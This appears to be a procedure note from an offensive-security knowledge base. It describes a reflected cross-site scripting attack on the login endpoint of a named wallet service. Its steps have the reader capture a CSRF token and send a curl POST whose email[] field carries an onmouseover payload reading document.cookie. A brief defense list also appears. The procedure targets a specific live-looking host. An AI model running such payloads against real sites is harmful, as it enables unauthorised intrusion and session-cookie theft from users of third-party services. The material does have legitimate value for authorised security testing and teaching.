---
id: proc-submit-xss-post
tags:
  - xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/submit-xss-login-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:35.294Z'
skill_level: beginner
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Submit POST Request with XSS Payload

## Summary

Submit a modified POST request to the login endpoint with an XSS payload in the email parameter, resulting in unsanitized reflection on the error page.

## Description

The wallet application's login form at /login accepts POST data without proper sanitization of the email[] parameter. By injecting HTML/JavaScript, the payload reflects directly into the HTML of the error page, enabling execution when loaded in a browser. This procedure uses a mouseover-triggered payload for controlled testing.

## Requirements

1. Captured CSRF token from the login form
2. Tool to send HTTP POST requests (e.g., curl or browser proxy)
3. Valid dummy password for form completion

## Defense

Defensive measures and detection strategies:

- Sanitize and encode all user inputs on output (e.g., HTML entity encoding)
- Log and alert on POST requests containing script tags or event handlers
- Rate-limit login attempts to prevent abuse

## Objectives

1. Inject payload to exploit lack of input validation
2. Trigger server reflection without authentication
3. Confirm vulnerability through response inspection

## Instructions

### Step 1: Capture Form Details

**Context**: Ensure you have the exact endpoint and parameters from the form.

**Command** ([[commands/submit-xss-login-payload]]):
```bash
# Inspect form to get _csrf token
```

> Use browser dev tools to copy the token value.

### Step 2: Send POST with Payload

**Context**: Execute the submission to the /login endpoint.

**Command** ([[commands/submit-xss-login-payload]]):
```bash
curl -X POST https://wallet.romit.io/login \
  -d "email[]=<a onmouseover=alert(document.cookie)>xxs link</a>&password=g00dPa%24%24w0rD&_csrf=5afeda5f-e604-4ba0-bd60-d83f975853c5" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

> The response should be an HTML error page. Save and open it in a browser to check for reflection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- [[commands/submit-xss-login-payload]]

## Tools Used

- None

## Tags

- [[xss]]
- [[post-request]]
- [[injection]]
